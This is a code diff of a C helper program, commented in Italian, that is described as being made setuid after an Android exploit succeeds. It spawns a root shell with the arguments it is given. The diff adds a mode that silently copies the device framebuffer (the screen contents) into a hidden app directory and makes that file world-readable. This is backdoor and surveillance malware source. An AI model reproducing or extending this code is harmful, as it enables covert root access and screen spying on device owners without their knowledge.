@@ -23,6 +23,8 @@
 
 #define LOG(x)  printf(x)
 
+static int copy(const char *from, const char *to);
+
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
@@ -36,19 +38,60 @@ int main(int argc, char** argv) {
 	sprintf(buf, "Exploit Status: EUID: %d, UID: %d\n", geteuid(), getuid());
 	LOG(buf);
 
-	const char * shell = "/system/bin/sh";
-	LOG("Starting shell\n");
+	if ( argc == 2 && strcmp(argv[1], "fb") == 0) {
+		char* filename = "/data/data/com.android.service/files/frame";
+		copy("/dev/graphics/fb0", filename);
+		chmod("/data/data/com.android.service/files/frame", 0666);
+	} else {
 
-	char *exec_args[argc + 1];
-	exec_args[argc] = NULL;
-	exec_args[0] = "sh";
-	int i;
-	for (i = 1; i < argc; i++) {
-		exec_args[i] = argv[i];
+		const char * shell = "/system/bin/sh";
+		LOG("Starting shell\n");
+
+		char *exec_args[argc + 1];
+		exec_args[argc] = NULL;
+		exec_args[0] = "sh";
+		int i;
+		for (i = 1; i < argc; i++) {
+			exec_args[i] = argv[i];
+		}
+		execv("/system/bin/sh", exec_args);
+
+		LOG("Exiting shell\n");
 	}
-	execv("/system/bin/sh", exec_args);
-
-	LOG("Exiting shell\n");
 
 	return 0;
 }
+
+static int copy(const char *from, const char *to) {
+	int fd1, fd2;
+	char buf[0x1000];
+	int r = 0;
+
+	if ((fd1 = open(from, O_RDONLY)) < 0) {
+		return -1;
+	}
+
+	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
+		close(fd1);
+		return -1;
+	}
+
+	for (;;) {
+		r = read(fd1, buf, sizeof(buf));
+
+		if (r <= 0)
+			break;
+
+		if (write(fd2, buf, r) != r)
+			break;
+	}
+
+	close(fd1);
+	close(fd2);
+
+	sync();
+	sync();
+
+	return r;
+}
+
